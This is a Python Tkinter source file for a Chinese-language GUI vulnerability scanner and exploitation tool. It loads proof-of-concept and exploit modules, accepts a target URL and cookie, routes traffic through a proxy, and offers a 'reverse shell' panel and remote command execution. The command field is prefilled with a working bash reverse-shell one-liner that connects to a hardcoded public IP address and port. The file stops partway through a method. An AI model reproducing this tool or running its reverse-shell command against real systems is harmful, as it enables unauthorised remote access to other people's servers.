# -*- coding:UTF-8 -*-
from tkinter import *
from tkinter import ttk,messagebox,scrolledtext
import os,sys,time,socket,socks,datetime
import tkinter.filedialog,importlib,glob,requests
import threading,ast,math,json
import urllib3
import inspect
import ctypes
import string
import prettytable as pt
from requests_toolbelt.utils import dump
from tkinter.filedialog import askopenfilename
from keyword import kwlist
from exp10it import seconds2hms
from colorama import init, Fore, Back, Style
from concurrent.futures import ThreadPoolExecutor,wait,as_completed,ALL_COMPLETED
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class MyGUI:
    def __init__(self):#初始化窗体对象
        self.root = Tk()
        self.root.iconbitmap('python.ico')
        self.title = self.root.title('POC检测')#设置title
        self.size = self.root.geometry('960x650+400+50')#设置窗体大小，850x550是窗体大小，400+50是初始位置
        self.exchange = self.root.resizable(width=False, height=False)#不允许扩大
        self.root.columnconfigure(0, weight=1)
        #对象属性参数字典
        self.frms = self.__dict__
        #创建顶级菜单
        self.menubar = Menu(self.root)
        #顶级菜单增加一个普通的命令菜单项
        self.menubar.add_command(label = "设置代理", command=lambda :TopProxy(gui.root))
        #创建子菜单
        self.menubar1 = Menu(self.root,tearoff=False)
        self.menubar1.add_command(label = "隐藏", command=note)
        self.menubar1.add_command(label = "显示", command=note)
        self.menubar1.add_command(label = "暂无", command=note)
        #顶级菜单添加一个子菜单
        self.menubar.add_cascade(label = "选项", menu = self.menubar1)
        #显示菜单
        self.root.config(menu = self.menubar)
        

    #创造幕布
    def CreateFrm(self):
        self.frmTOP = Frame(self.root, width=960 , height=25, bg='whitesmoke')
        self.frmPOC = Frame(self.root, width=960 , height=600, bg='white')
        self.frmEXP = Frame(self.root, width=960 , height=610, bg='white')
        self.frmCheck = Frame(self.root, width=960 , height=610, bg='white')


        self.frmTOP.grid(row=0, column=0, padx=2, pady=2)
        self.frmPOC.grid(row=1, column=0, padx=2, pady=2)
        #self.frmMain.destroy()

        #创建按钮
        self.frmTOPButton1 = Button(self.frmTOP, text='漏洞扫描', width = 10, command=POC)
        self.frmTOPButton2 = Button(self.frmTOP, text='漏洞利用', width = 10, command=EXP)
        self.frmTOPButton3 = Button(self.frmTOP, text='漏洞测试', width = 10, command=Check)
        self.frmTOPButton1.grid(row=0,column=0,padx=1, pady=1)
        self.frmTOPButton2.grid(row=0,column=2,padx=1, pady=1)
        self.frmTOPButton3.grid(row=0,column=3,padx=1, pady=1)
        
        self.frmTOP.grid_propagate(0)
        self.frmPOC.grid_propagate(0)
        self.frmEXP.grid_propagate(0)
        self.frmCheck.grid_propagate(0)


        #定义frame
        self.frmA = Frame(self.frmPOC, width=660, height=30,bg='white')#目标，输入框
        self.frmB = Frame(self.frmPOC, width=660, height=500, bg='white')#输出信息
        self.frmC = Frame(self.frmPOC, width=660, height=40, bg='white')#功能按钮
        #self.frmD = Frame(self.root, width=250, height=520)#POC
        #创建帆布
        #self.canvas = Canvas(self.frmPOC,width=300,height=590,scrollregion=(0,0,550,550)) #创建canvas
        #在帆布上创建frmD
        self.frmE = Frame(self.frmPOC, width=300, height=40,bg='white')
        #创建多个frm, 方便切换存储POC
        self.frms['frmD_'+str(1)] = Frame(self.frmPOC,width=300,height=500,bg='whitesmoke')
        self.frms['frmD_'+str(2)] = Frame(self.frmPOC,width=300,height=500,bg='whitesmoke')
        self.frms['frmD_'+str(3)] = Frame(self.frmPOC,width=300,height=500,bg='whitesmoke')
        self.frms['frmD_'+str(4)] = Frame(self.frmPOC,width=300,height=500,bg='whitesmoke')
        for i in range(1,5):
            #self.frms['frmD_'+str(i)].grid(row=1, column=1, padx=2, pady=2)
            self.frms['frmD_'+str(i)].grid_propagate(0)

        #self.canvas.create_window((0,0), window=self.frmD)#create_window
        self.frmF = Frame(self.frmPOC, width=300, height=40,bg='white')#
        #表格布局
        self.frmA.grid(row=0, column=0, padx=2, pady=2)
        self.frmB.grid(row=1, column=0, padx=2, pady=2)
        self.frmC.grid(row=2, column=0, padx=2, pady=2)
        #self.canvas.grid(row=1, column=1, rowspan=3, padx=2, pady=2)
        self.frmE.grid(row=0, column=1, padx=2, pady=2)
        self.frmD_1.grid(row=1, column=1, padx=2, pady=2)
        self.frmF.grid(row=2, column=1, padx=2, pady=2)
        #固定大小
        self.frmA.grid_propagate(0)
        self.frmB.grid_propagate(0)
        self.frmC.grid_propagate(0)
        self.frmE.grid_propagate(0)
        self.frmF.grid_propagate(0)
        #self.canvas.grid_propagate(0)
        

    #创造第一象限
    def CreateFirst(self):
        global EntA_6_V
        self.LabA = Label(self.frmA, text='目标')#显示
        self.EntA = Entry(self.frmA, width='50',highlightcolor='red', highlightthickness=1,font=("consolas",10)) #接受输入控件

        self.LabA2 = Label(self.frmA, text='端口')#显示
        self.EntA2 = Entry(self.frmA, width='7',highlightcolor='red', highlightthickness=1,font=("consolas",10)) #接受输入控件

        self.ButtonA = Button(self.frmA, text='...', width=5, command=lambda :Loadfile(self.root)) #批量导入文件

        #线程池数量
        self.LabA3 = Label(self.frmA, text='线程(1~10)')
        self.b1 = Spinbox(self.frmA,from_=1,to=10,wrap=True,width=3,font=("consolas",10),textvariable=EntA_6_V)

        #表格布局
        self.LabA.grid(row=0,column=0,padx=2, pady=2)
        self.EntA.grid(row=0,column=1,padx=2, pady=2)

        self.LabA2.grid(row=0,column=2,padx=2, pady=2)
        self.EntA2.grid(row=0,column=3,padx=2, pady=2)

        self.ButtonA.grid(row=0,column=4,padx=2, pady=2)

        self.LabA3.grid(row=0,column=5,padx=2, pady=2)
        self.b1.grid(row=0,column=6,padx=2, pady=2)
        #self.LabA3.grid(row=1,column=0)
        #self.EntA3.grid(row=1,column=1)

        #self.ButtonA1.grid(row=1,column=2,padx=4, pady=4)Times
    #创造第二象限
    def CreateSecond(self):
        self.TexB = Text(self.frmB, font=("consolas",10), width=91, height=32)
        self.ScrB = Scrollbar(self.frmB)  #滚动条控件
        #进度条控件
        #self.p1B = Label(self.frmB, text='进度条:')#显示

        self.p1 = ttk.Progressbar(self.frmB, length=640, mode="determinate",maximum=640,orient=tkinter.HORIZONTAL)
        #表格布局
        self.TexB.grid(row=1,column=0)
        self.ScrB.grid(row=1,column=1, sticky=S + W + E + N)#允许拖动
        self.ScrB.config(command=self.TexB.yview)
        self.TexB.config(yscrollcommand=self.ScrB.set)
        #进度条布局
        #self.p1B.grid(row=2,column=1)
        self.p1.grid(row=2,column=0,sticky=W)

    #创造第三象限
    def CreateThird(self):
        global now_text,EntA_6_V
        self.ButtonC1 = Button(self.frmC, text='验 证', width = 10, command=lambda :self.thread_it(BugTest,**{"url":self.EntA.get(),"port":self.EntA2.get(),"file_list":now_text,'pool':EntA_6_V.get()}))
        self.ButtonC2 = Button(self.frmC, text='终 止', width = 10, command=lambda :self.stop_thread())
        self.ButtonC3 = Button(self.frmC, text='清空信息', width = 15, command=lambda :delText(gui.TexB))
        self.ButtonC4 = Button(self.frmC, text='重新载入当前POC', width = 15, command=ReLoad)
        self.ButtonC5 = Button(self.frmC, text='当前环境变量', width = 15, command=ShowPython)
        self.LabCA    = Label(self.frmC, text='当前运行状态')
        self.TexCA    = Text(self.frmC, font=("consolas",10), width=2, height=1)

        #self.TexCA.tag_add("here", "1.0","end")
        #self.TexCA.tag_config("here", background="blue")
        self.TexCA.configure(state="disabled")
        #表格布局
        self.ButtonC1.grid(row=0, column=0,padx=2, pady=2)
        self.ButtonC2.grid(row=0, column=1,padx=2, pady=2)
        self.ButtonC3.grid(row=0, column=2,padx=2, pady=2)
        self.ButtonC4.grid(row=0, column=3,padx=2, pady=2)
        self.ButtonC5.grid(row=0, column=4,padx=2, pady=2)
        self.LabCA.grid(row=0, column=5,padx=2, pady=2)
        self.TexCA.grid(row=0, column=6,padx=2, pady=2)
    #创造第四象限
    def CreateFourth(self):
        global Checkbutton_text,vuln
        self.ButtonE1 = Button(self.frmE, text='加载POC', width =8, command=LoadPoc)
        self.ButtonE2 = Button(self.frmE, text='编辑文件', width = 10, command=lambda:Topfile(gui.root,Checkbutton_text,'1',vuln))
        self.ButtonE3 = Button(self.frmE, text='打开脚本目录', width = 15, command=LoadCMD)

        self.ButtonE1.grid(row=0, column=0,padx=2, pady=2)
        self.ButtonE2.grid(row=0, column=1,padx=2, pady=2)
        self.ButtonE3.grid(row=0, column=2,padx=2, pady=2)

        #self.vbar = Scrollbar(self.canvas, orient=VERTICAL) #竖直滚动条
        #self.vbar.grid(row=1, sticky=S + W + E + N)#允许拖动
        #self.vbar.config(command=self.canvas.yview)
        #self.canvas.config(yscrollcommand = self.vbar.set)

    def CreateFivth(self):
        self.ButtonF1 = Button(self.frmF, text='1', width =8, command=lambda:Area_POC(1))
        self.ButtonF2 = Button(self.frmF, text='2', width =8, command=lambda:Area_POC(2))
        self.ButtonF3 = Button(self.frmF, text='3', width =8, command=lambda:Area_POC(3))
        self.ButtonF4 = Button(self.frmF, text='4', width =8, command=lambda:Area_POC(4))

        self.ButtonF1.grid(row=0, column=0,padx=2, pady=2)
        self.ButtonF2.grid(row=0, column=1,padx=2, pady=2)
        self.ButtonF3.grid(row=0, column=2,padx=2, pady=2)
        self.ButtonF4.grid(row=0, column=3,padx=2, pady=2)
    
    def thread_it(self,func,**kwargs):
        self.t = threading.Thread(target=func,kwargs=kwargs)
        self.t.setDaemon(True)   # 守护--就算主界面关闭，线程也会留守后台运行（不对!）
        self.t.start()           # 启动
    
    def stop_thread(self):
        try:
            _async_raise(self.t.ident, SystemExit)
            print("[*]已停止运行")
        except Exception as e:
            tkinter.messagebox.showinfo('提示','没有正在运行的进程!')

    #开始循环
    def start(self):
        self.CreateFrm()
        self.CreateFirst()
        self.CreateSecond()
        self.CreateThird()
        self.CreateFourth()
        self.CreateFivth()
        ###EXP界面组件创建
        #exp = MyEXP(self.root,self.frmEXP)
        #exp.start()
        ###EXP界面组件创建

#输出重定向
class TextRedirector(object):
    def __init__(self, widget, tag="stdout", index="1"):
        self.widget = widget
        self.tag = tag
        self.index = index
        #颜色定义
        self.widget.tag_config("red", foreground="red")
        self.widget.tag_config("white", foreground="white")
        self.widget.tag_config("green", foreground="green")
        self.widget.tag_config("black", foreground="black")
        self.widget.tag_config("yellow", foreground="yellow")
        self.widget.tag_config("blue", foreground="blue")
        self.widget.tag_config("orange", foreground="orange")
        self.widget.tag_config("pink", foreground="pink")
        self.widget.tag_config("cyan", foreground="cyan")
        self.widget.tag_config("magenta", foreground="magenta")
        self.widget.tag_config("fuchsia", foreground="fuchsia")

    def write(self, str):
        if self.index == "2":###命令执行背景是黑色，字体是绿色。
            self.tag = 'white'
            self.widget.configure(state="normal")
            self.widget.insert(END, str, (self.tag,))
            self.widget.configure(state="disabled")
            self.widget.see(END)
        else:
            self.tag = 'black'
            self.widget.configure(state="normal")
            self.widget.insert(END, str, (self.tag,))
            self.widget.configure(state="disabled")
            self.widget.see(END)

    def Colored(self, str, color='black', end='\n'):
        if end == '':
            str = str.strip('\n')
        self.tag = color
        self.widget.configure(state="normal")
        self.widget.insert(END, str, (self.tag,))
        self.widget.configure(state="disabled")
        self.widget.see(END)

    def flush(self):
        self.widget.update()

    def waitinh(self):
        self.widget.configure(state="normal")
        self.widget.insert(END, str, (self.tag,))
        self.widget.configure(state="disabled")
        self.widget.see(END)

class TopProxy():
    def __init__(self,root):
        global variable_dict,temp

        self.Proxy = Toplevel(root)
        self.Proxy.title("代理服务器设置")
        self.Proxy.geometry('300x300+650+150')

        self.frmA = Frame(self.Proxy, width=300, height=50)
        self.frmB = Frame(self.Proxy, width=300, height=250)
        self.frmA.grid(row=0, column=0, padx=10, pady=10)
        self.frmB.grid(row=1, column=0, padx=10, pady=10)

        self.frmA.grid_propagate(0)
        self.frmB.grid_propagate(0)

        self.button1 = Checkbutton(self.frmA,text="启用",command=lambda:self.Yes(),variable=variable_dict["CheckVar1"])
        self.button2 = Checkbutton(self.frmA,text="禁用",command=lambda:self.No(),variable=variable_dict["CheckVar2"])
        
        self.button1.grid(row=0, column=0)
        self.button2.grid(row=0, column=1)

        self.LabA = Label(self.frmB, text='类型')#显示
        self.comboxlistA = ttk.Combobox(self.frmB,width=12,textvariable=variable_dict["PROXY_TYPE"],state='readonly') #接受输入控件
        self.comboxlistA["values"]=("SOCKS5","SOCKS4","HTTP")
        #self.comboxlistA.current(0)

        self.LabB = Label(self.frmB, text='IP地址:')#显示
        self.EntB = Entry(self.frmB, width='30',textvariable=variable_dict["addr"]) #接受输入控件

        self.LabC = Label(self.frmB, text='端口:')#显示
        self.EntC = Entry(self.frmB, width='30',textvariable=variable_dict["port"]) #接受输入控件

        self.LabD = Label(self.frmB, text='用户名:')#显示
        self.EntD = Entry(self.frmB, width='30') #接受输入控件

        self.LabE = Label(self.frmB, text='密码:')#显示
        self.EntE = Entry(self.frmB, width='30') #接受输入控件

        self.LabA.grid(row=0, column=0,padx=2, pady=2)
        self.comboxlistA.grid(row=0, column=1,padx=2, pady=2)

        self.LabB.grid(row=1, column=0,padx=2, pady=2)
        self.EntB.grid(row=1, column=1,padx=2, pady=2)

        self.LabC.grid(row=2, column=0,padx=2, pady=2)
        self.EntC.grid(row=2, column=1,padx=2, pady=2)

        self.LabD.grid(row=3, column=0,padx=2, pady=2)
        self.EntD.grid(row=3, column=1,padx=2, pady=2)

        self.LabE.grid(row=4, column=0,padx=2, pady=2)
        self.EntE.grid(row=4, column=1,padx=2, pady=2)
        #print(variable_dict["CheckVar1"].get(),variable_dict["CheckVar2"].get())
    def Yes(self):
        variable_dict["CheckVar2"].set(0)
        if variable_dict["CheckVar1"].get() == 1:

            str1 = variable_dict["PROXY_TYPE"].get()
            #print(str1)
            ip = self.EntB.get() if self.EntB.get() else None
            port = int(self.EntC.get()) if self.EntC.get() else None
            username = self.EntD.get() if self.EntD.get() else None
            passwd = self.EntE.get() if self.EntE.get() else None

            variable_dict["PROXY_TYPE"].set(str1)
            #print(ip,port,username,passwd)
            #print(variable_dict["CheckVar1"].get(),variable_dict["CheckVar2"].get())
            socks.set_default_proxy(PROXY_TYPE[variable_dict["PROXY_TYPE"].get()], ip, port)
            socket.socket = socks.socksocket
            print('[*]设置代理成功')
        else:
            socket.socket=temp
            print('[*]取消代理')

        
    def No(self):
        variable_dict["CheckVar1"].set(0)
        if variable_dict["CheckVar2"].get() == 1:
            socket.socket=temp
            #print(variable_dict["CheckVar1"].get(),variable_dict["CheckVar2"].get())
            print('[*]禁用代理')




class Loadfile():
    global now_text
    def __init__(self,root):
        self.file = Toplevel(root)
        self.file.title("文本选择")
        self.file.geometry('500x300+650+150')
        self.exchange = self.file.resizable(width=False, height=False)#不允许扩大

        #顶级菜单
        self.menubar = Menu(self.file)
        self.menubar.add_command(label = "导 入", command=self.openfile)
        self.menubar.add_command(label = "清 空", command=self.clearfile)
        self.menubar.add_command(label = "添加http", command=self.addhttp)

        #显示菜单
        self.file.config(menu = self.menubar)
        self.frmA = Frame(self.file, width=795, height=395,bg="white")
        self.frmA.grid(row=0, column=0, padx=3, pady=3)

        self.TexA = tkinter.scrolledtext.ScrolledText(self.frmA,font=("consolas",10),width='68',height='19', undo = True)
        self.TexA.pack(side=tkinter.LEFT,expand=tkinter.YES,fill=tkinter.BOTH)

        self.TexA.insert(INSERT, now_text.replace(' ',''))
        #self.file.wm_attributes('-topmost',1)
        self.file.protocol("WM_DELETE_WINDOW", self.close)


    def openfile(self):
        global now_text
        self.clearfile()
        default_dir = r"./"
        file_path = askopenfilename(title=u'选择文件', initialdir=(os.path.expanduser(default_dir)))
        try:
            with open(file_path, mode='r', encoding='utf-8') as f:
                array = f.readlines()
                for i in array: #遍历array中的每个元素
                    self.TexA.insert(INSERT, i.replace(' ',''))
        except Exception as e:
            pass
        

    def clearfile(self):
        global now_text
        now_text = ''
        self.TexA.delete('1.0','end')

    def close(self):
        global now_text
        now_text = self.TexA.get('0.0','end')
        self.file.destroy()

    def addhttp(self):
        global now_text
        now_text = self.TexA.get('0.0','end')
        self.TexA.delete('1.0','end')
        array = now_text.split("\n")
        array = [i for i in array if i!='']
        #print(array)
        index = 1
        for i in array:
            i = 'http://'+i.replace('http://','').replace('https://','')
            if index == len(array):
                self.TexA.insert(INSERT, i)
            else:
                self.TexA.insert(INSERT, i+'\n')
            index = index+1
        now_text = self.TexA.get('0.0','end')


class Topfile():
    def __init__(self,root,file_name,Logo,vuln_select):
        if Logo == '2':
            self.file_name1 = './EXP/' + file_name + '.py'
        else:
            self.file_name1 = './POC/' + file_name + '.py'
        #print(self.file_name1)
        if os.path.exists(self.file_name1) == False:
            messagebox.showinfo(title='提示', message='还未选择模块')
            #print('[-]还未选择模块,无法编辑')
            return
        self.vuln_select = vuln_select
        self.file_name = file_name
        self.file = Toplevel(root)
        self.file.title("文本编辑")
        self.file.geometry('800x400+650+150')
        self.exchange = self.file.resizable(width=False, height=False)#不允许扩大
        #顶级菜单
        self.menubar = Menu(self.file)
        self.menubar.add_command(label = "保 存", accelerator="ctrl + s", command=lambda :self.save_file('1',self.vuln_select))
        self.menubar.add_command(label = "撤 销", accelerator="Ctrl + Z", command=self.move)
        self.file.bind("<Control-s>",lambda event:self.save_file('1',self.vuln_select))

        #显示菜单
        self.file.config(menu = self.menubar)

        self.frmA = Frame(self.file, width=795, height=395,bg="white")
        self.frmA.grid(row=0, column=0, padx=3, pady=3)

        self.TexA = tkinter.scrolledtext.ScrolledText(self.frmA,font=("consolas",10),width='110',height='25',undo = True)
        self.TexA.pack(side=tkinter.LEFT,expand=tkinter.YES,fill=tkinter.BOTH)
        self.TexA.bind('<KeyRelease>', self.process_key)

        self.TexA.tag_config('bif', foreground='purple')
        self.TexA.tag_config('kw', foreground='orange')
        self.TexA.tag_config('comment', foreground='red')
        self.TexA.tag_config('string', foreground='green')

        self.openRender()
    def move(self):
        self.TexA.edit_undo()

    def openRender(self):
        try:
            with open(self.file_name1, mode='r', encoding='utf-8') as f:
                array = f.readlines()
                for i in array: #遍历array中的每个元素
                    self.TexA.insert(INSERT, i)
                #self.render()#此处是用来渲染文件颜色的，但是有BUG，暂时不用
        except FileNotFoundError:
            print('[-]还未选择模块,无法编辑')
            return

    def save_file(self,event,vuln_select):
        #global vuln_1
        #if messagebox.askokcancel('提示','要执行此操作吗?') == True:
        if vuln_select == None:
            self.file.destroy()
            messagebox.showinfo(title='提示', message='还未选择模块')
            return
        save_data = str(self.TexA.get('0.0','end'))
        try:
            fobj_w = open(self.file_name1, 'w',encoding='utf-8')
            fobj_w.writelines(save_data)
            fobj_w.close()
            #self.openRender()
            vuln_select = importlib.reload(vuln_select)
            #vuln = importlib.import_module('.%s'%self.file_name,package='EXP')
            #messagebox.showinfo(title='结果', message='保存成功')
            print('[*]保存成功,%s模块已重新载入!'%self.file_name)
        except Exception as e:
            print("异常对象的内容是%s"%e)
            #print(self.file_name1)
            messagebox.showerror(title='结果', message='出现错误')
        
    def process_key(self,key):
        current_line_num, current_col_num = map(int, self.TexA.index(tkinter.INSERT).split('.'))
        if key.keycode == 13:
            last_line_num = current_line_num - 1
            last_line = self.TexA.get(f'{last_line_num}.0', tkinter.INSERT).rstrip()
            #计算最后一行的前导空格数量
            num = len(last_line) - len(last_line.lstrip(' '))
            #最后一行以冒号结束，或者冒号后面有#单行注释
            if (last_line.endswith(':') or
                (':' in last_line and last_line.split(':')[-1].strip().startswith('#'))):
                num = num + 4
            elif last_line.strip().startswith(('return','break','continue','pass','raise')):
                num = num - 4
            self.TexA.insert(tkinter.INSERT,' '*num)
        #按下退格键BackSpace
        
        elif key.keysym == 'BackSpace':
            #当前行从开始到鼠标位置的内容
            current_line = self.TexA.get(f'{current_line_num}.0',f'{current_line_num}.{current_col_num}')
            #当前光标位置前面的空格数量
            num = len(current_line) - len(current_line.rstrip(' '))
            #最多删除4个空格
            #这段代码是按下退格键删除了一个字符之后才执行的，所以还需要再删除最多3个空格
            num = min(4,num)
            if num > 1 and num != 4:
                self.TexA.delete(f'{current_line_num}.{current_col_num-num}',f'{current_line_num}.{current_col_num}')
    def render(self):
        lines = self.TexA.get('0.0',tkinter.END).rstrip('\n').splitlines(keepends=True)
        #删除原来的内容
        self.TexA.delete('0.0',tkinter.END)
        #再把原来的内容放回去，给不同子串加不同标记
        for line in lines:
            #flag1表示当前是否处于单词中
            #flag2表示当前是否处于双引号的包围范围之内
            #flag3表示当前是否处于单引号的包围范围之内
            flag1, flag2, flag3 = False, False, False
            for index, ch in enumerate(line):
                if ch == "'" and not flag2:
                    #左右引号切换
                    flag3 = not flag3
                    self.TexA.insert(tkinter.INSERT, ch, 'string')
                elif ch == '"' and not flag3:
                    flag2 = not flag2
                    self.TexA.insert(tkinter.INSERT, ch, 'string')
                #引号之内，直接绿色显示
                elif flag2 or flag3:
                    self.TexA.insert(tkinter.INSERT, ch, 'string')
                #不是引号，也不再引号之内
                else:
                    #当前字符不是字母
                    if ch not in string.ascii_letters:
                        #但是前一个字符是字母，说明一个单词结束
                        if flag1:
                            flag1 = False
                            #获取该位置前面的最后一个单词
                            word = line[start:index]
                            #内置函数，加标记
                            if word in bifs:
                                self.TexA.insert(tkinter.INSERT, word, 'bif')
                            #关键字，加标记
                            elif word in kws:
                                self.TexA.insert(tkinter.INSERT, word, 'kw')
                            #普通字符串，不加标记
                            else:
                                self.TexA.insert(tkinter.INSERT, word)
                        if ch == '#':
                            self.TexA.insert(tkinter.INSERT, line[index:], 'comment')
                            break
                        else:
                            self.TexA.insert(tkinter.INSERT, ch)
                    else:
                        #一个新单词的开始
                        if not flag1:
                            flag1 = True
                            start = index
            #暂时有BUG，当引号前面有字符时，会出错
            #考虑该行最后一个字符是字母的情况
            #正在输入的当前行最后一个字母大部分情况下是字母
            '''
            if flag1:
                flag1 = False
                word = line[start:]
                if word in bifs:
                    self.TexA.insert(tkinter.INSERT, word, 'bif')
                elif word in kws:
                    self.TexA.insert(tkinter.INSERT, word, 'kw')
                else:
                    self.TexA.insert(tkinter.INSERT, word)
            '''
    #原来的内容重新着色以后，光标位置会在文本框的最后
    #这一行用来把光标位置移动到指定位置，也就是正在修改的位置
    #workArea.see(END)
    #workArea.mark_set('insert', f'{current_line_num}.{current_col_num}')


class MyEXP:
    def __init__(self,root,frmEXP):
        self.frmEXP = frmEXP
        self.root = root

    def CreateFrm(self):
        self.frmTOP = Frame(self.frmEXP, width=960, height=220,bg='white')#
        self.frmBOT = Frame(self.frmEXP, width=960, height=410,bg='white')#

        self.frmTOP.grid(row=0, column=0, padx=2, pady=2)
        self.frmBOT.grid(row=1, column=0, padx=2, pady=2)
        self.frmTOP.grid_propagate(0)
        self.frmBOT.grid_propagate(0)

        self.frmA = Frame(self.frmTOP, width=560, height=220,bg='white')#目标，输入框
        self.frmB = Frame(self.frmTOP, width=400, height=220, bg='white')#输出信息
        #self.frmC = Frame(self.frmTOP, width=960, height=380, bg='black')#输出信息
        
        #表格布局
        self.frmA.grid(row=0, column=0, padx=2, pady=2)
        self.frmB.grid(row=0, column=1, padx=2, pady=2)
        #self.frmC.grid(row=1, column=0, padx=2, pady=2)

        #固定大小
        self.frmA.grid_propagate(0)
        self.frmB.grid_propagate(0)
        #self.frmC.grid_propagate(0)

    def CreateFirst(self):
        global comvalue_1,comvalue_2,vuln_1
        global EntA_1_V,EntA_2_V,EntA_4_V,EntA_5_V,EntABOT_1_V#url,cookie,ip,port,cmd
        self.frame_1 = LabelFrame(self.frmA, text="基本配置", labelanchor="nw", width=550, height=110, bg='white')
        self.frame_2 = LabelFrame(self.frmA, text="反弹shell", labelanchor="nw", width=550, height=100, bg='white')
        #self.frame_3 = LabelFrame(self.frmA, text="heads", labelanchor="nw", width=360, height=250, bg='black')
        self.frame_1.grid(row=0, column=0, padx=2, pady=2)
        self.frame_2.grid(row=1, column=0, padx=2, pady=2)
        #self.frame_3.grid(row=0, column=1, padx=2, pady=2)
        self.frame_1.grid_propagate(0)
        self.frame_2.grid_propagate(0)
        #self.frame_3.grid_propagate(0)

        ###基本配置
        self.label_1 = Label(self.frame_1, text="目标地址")
        self.EntA_1 = Entry(self.frame_1, width='58',highlightcolor='red', highlightthickness=1,textvariable=EntA_1_V,font=("consolas",10)) #接受输入控件

        self.label_2 = Label(self.frame_1, text="Cookie")
        self.EntA_2 = Entry(self.frame_1, width='58',highlightcolor='red', highlightthickness=1,textvariable=EntA_2_V,font=("consolas",10)) #接受输入控件

        self.label_3 = Label(self.frame_1, text="漏洞名称")
        self.comboxlist_3 = ttk.Combobox(self.frame_1,width='34',textvariable=comvalue_1,state='readonly') #接受输入控件
        self.comboxlist_3["values"] = tuple(exp_scripts)
        self.comboxlist_3.bind("<<ComboboxSelected>>", bind_combobox)

        self.comboxlist_3_1 = ttk.Combobox(self.frame_1,width='16',textvariable=comvalue_2,state='readonly') #接受输入控件2
        #self.comboxlist_3_1["values"] = tuple(exp_scripts_cve)
        #self.comboxlist_3_1.bind("<<ComboboxSelected>>", bind_combobox)
        #self.comboxlist_3.current(0)
        self.button_3 = Button(self.frame_1, text="编辑文件",command=lambda:Topfile(gui.root,comvalue_1.get(),'2',vuln_1))

        
        self.label_1.grid(row=0,column=0,padx=3, pady=3)
        self.EntA_1.grid(row=0,columnspan=4,padx=3, pady=3)

        self.label_2.grid(row=1,column=0,padx=3, pady=3)
        self.EntA_2.grid(row=1,columnspan=4,padx=3, pady=3)

        self.label_3.grid(row=2,column=0,padx=3, pady=3,sticky=W)
        self.comboxlist_3.grid(row=2,column=1,padx=3, pady=3,sticky=W)
        self.comboxlist_3_1.grid(row=2,column=2,padx=3, pady=3,sticky=W)
        self.button_3.grid(row=2,column=3,padx=3, pady=3,sticky=W)

        ###反弹shell
        self.label_4 = Label(self.frame_2, text="IP地址")
        self.EntA_4 = Entry(self.frame_2, width='30',highlightcolor='red', highlightthickness=1,textvariable=EntA_4_V,font=("consolas",10)) #接受输入控件

        self.label_5 = Label(self.frame_2, text="Port")
        self.EntA_5 = Entry(self.frame_2, width='10',highlightcolor='red', highlightthickness=1,textvariable=EntA_5_V,font=("consolas",10)) #接受输入控件

        self.button = Button(self.frame_2, text="反弹shell",command=lambda :self.thread_it(GetShell,**{"url":EntA_1_V.get(),"cookie":EntA_2_V.get(),"ip":EntA_4_V.get(),"port":EntA_5_V.get(),"cmd":EntABOT_1_V.get(),'pocname':self.comboxlist_3_1.get()}))
        
        self.label_4.grid(row=0,column=0,padx=3, pady=3)
        self.EntA_4.grid(row=0,column=1,padx=3, pady=3)

        self.label_5.grid(row=0,column=2,padx=3, pady=3)
        self.EntA_5.grid(row=0,column=3,padx=3, pady=3)

        self.button.grid(row=0,column=5,padx=3, pady=3)

    def CreateSecond(self):
        self.frame_B1 = LabelFrame(self.frmB, text="备注", labelanchor="nw", width=400, height=250, bg='white')
        self.frame_B1.grid(row=0, column=0, padx=2, pady=2)
        self.frame_B1.propagate()

        self.TexB1 = Text(self.frame_B1, font=("consolas",10), width=50, height=12)
        self.ScrB1 = Scrollbar(self.frame_B1)

        self.TexB1.grid(row=0, column=0, padx=2, pady=2)
        self.ScrB1.grid(row=0, column=1, sticky=S + W + E + N)
        self.ScrB1.config(command=self.TexB1.yview)
        self.TexB1.config(yscrollcommand=self.ScrB1.set)

        with open('note.txt', mode='r', encoding='utf-8') as f:
            array = f.readlines()
            for i in array: #遍历array中的每个元素
                self.TexB1.insert(INSERT, i)

    def CreateThird(self):
        global EntA_1_V,EntA_2_V,EntA_4_V,EntA_5_V,EntABOT_1_V
        self.frmBOT_1 = LabelFrame(self.frmBOT, text="命令执行", labelanchor="nw", width=950, height=365, bg='white')
        self.frmBOT_1_1 = Frame(self.frmBOT_1,width=940, height=40,bg='white')
        self.frmBOT_1_2 = Frame(self.frmBOT_1,width=940, height=250,bg='white')

        self.frmBOT_1.grid(row=0, column=0 , padx=2, pady=2)
        self.frmBOT_1_1.grid(row=0, column=0 , padx=2, pady=2)
        self.frmBOT_1_2.grid(row=1, column=0 , padx=2, pady=2)

        self.frmBOT_1.propagate()
        self.frmBOT_1_1.propagate()
        self.frmBOT_1_2.propagate()

        self.labelBOT_1 = Label(self.frmBOT_1_1, text="CMD命令")
        self.EntABOT_1 = Entry(self.frmBOT_1_1, width='100',highlightcolor='red', highlightthickness=1,textvariable=EntABOT_1_V,font=("consolas",10)) #接受输入控件
        self.EntABOT_1.insert(0, "bash -i >& /dev/tcp/47.100.137.231/10086 0>&1")
        self.buttonBOT_1 = Button(self.frmBOT_1_1, text="执行命令",command=lambda :self.thread_it(exeCMD,**{"url":EntA_1_V.get(),"cookie":EntA_2_V.get(),"ip":EntA_4_V.get(),"port":EntA_5_V.get(),"cmd":EntABOT_1_V.get(),'pocname':self.comboxlist_3_1.get()}))
        self.buttonBOT_2 = Button(self.frmBOT_1_1, text='清空信息', command=lambda :delText(exp.TexBOT_1_2))
        self.labelBOT_1.grid(row=0, column=0 , padx=2, pady=2,sticky=W)
        self.EntABOT_1.grid(row=0, column=1 , padx=2, pady=2)
        self.buttonBOT_1.grid(row=0, column=2 , padx=2, pady=2)
        self.buttonBOT_2.grid(row=0, column=3 , padx=2, pady=2)

        self.TexBOT_1_2 = Text(self.frmBOT_1_2, font=("consolas",10), width=132, height=20,bg='black')
        self.ScrBOT_1_2 = Scrollbar(self.frmBOT_1_2)  #滚动条控件

        #提前定义颜色
        self.TexBOT_1_2.tag_add("here", "1.0","end")
        self.TexBOT_1_2.tag_config("here", background="black")

        self.TexBOT_1_2.grid(row=0, column=1 , padx=2, pady=2)
        self.ScrBOT_1_2.grid(row=0, column=2, sticky=S + W + E + N)
        self.ScrBOT_1_2.config(command=self.TexBOT_1_2.yview)
        self.TexBOT_1_2.config(yscrollcommand=self.ScrBOT_1_2.set)

    def thread_it(self,func,**kwargs):
        self.t = threading.Thread(target=func,kwargs=kwargs)
